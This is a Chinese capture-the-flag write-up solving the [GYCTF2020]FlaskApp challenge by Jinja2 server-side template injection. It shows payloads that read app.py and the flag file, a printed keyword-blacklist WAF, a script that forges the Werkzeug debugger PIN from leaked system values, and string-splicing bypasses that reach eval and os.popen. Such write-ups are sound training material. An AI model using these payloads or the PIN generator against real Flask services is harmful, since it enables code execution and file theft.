# Flask+SSTI的新火花

记一次buu刷题记和回顾祥云杯被虐出屎的经历。题目：**[GYCTF2020]FlaskApp**

## 一 题目初见

朴实无华的页面，一个base64的小程序页面

![image-20201124235652622](https://img.dem0dem0.top/images/image-20201124235652622.png)

看到有提示。

![image-20201124235709905](https://img.dem0dem0.top/images/image-20201124235709905.png)

我就想到了可能是flask的失败报错界面和pin码的获取（来源祥云杯的虐后感）

## 二 开始解题

![image-20201124235832987](https://img.dem0dem0.top/images/image-20201124235832987.png)

看到这里就不用多解释了，输入一个非法的字符串会自动跳转到这里，我们接着思路，可以在这里查看源码。

![image-20201124235919632](https://img.dem0dem0.top/images/image-20201124235919632.png)

可以看到是将解密之后的字符串**直接输出**到页面上，不用说SSTI安排上。

![image-20201125000013089](https://img.dem0dem0.top/images/image-20201125000013089.png)

![image-20201125000045001](https://img.dem0dem0.top/images/image-20201125000045001.png)

触发了waf。大概流程就是，在加密页面将注入的内容变成base64，再解密的解密进行解密。**至于waf嘛**，没有源代码，只能一个一个的尝试。注意python是3.8.7的版本。

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

这里借用答案的一个payload，直接进行读取文件。看到waf函数

```
def waf(str):
    black_list = [&#34;flag&#34;,&#34;os&#34;,&#34;system&#34;,&#34;popen&#34;,&#34;import&#34;,&#34;eval&#34;,&#34;chr&#34;,&#34;request&#34;,
                  &#34;subprocess&#34;,&#34;commands&#34;,&#34;socket&#34;,&#34;hex&#34;,&#34;base64&#34;,&#34;*&#34;,&#34;?&#34;]
    for x in black_list :
        if x in str.lower() :
            return 1

```

一看凉了，没有命令执行了。当然不可能不可以命令执行的，python可是最骚的语言。

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

只有进行文件读取，但是flag这个文件不知道文件名字，就只能采取获取pin码在这里进行任意python代码执行。

### 要生成pin码，我们需要以下几个信息

```
(1)flask所登录的用户名。可以通过读取/etc/password知道 用户为flaskweb
(2) modname 一般不变就是flask.app
(3)getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变
(4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： /usr/local/lib/python3.7/site-packages/flask/app.py
(5)当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address读取。
(6)docker机器id对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件。对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，
```

payload就自己构造吧，放上收藏已久的秘密小脚本跑就行了。

```
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485410388611',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

```

题目完结。

## 三 非预期解

首先我们可以看到这个waf实在是太废物了，等于没有。字符串拼接的方法，字符串倒置的方法都可以对他进行绕过，辣鸡。

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}

```

```
{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}   {% for b in c.__init__.__globals__.values() %}   {% if b.__class__ == {}.__class__ %}     {% if 'eva'+'l' in b.keys() %}       {{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("cat /this_is_the_fl'+'ag.txt").read()') }}     {% endif %}   {% endif %}   {% endfor %} {% endif %} {% endfor %}

```

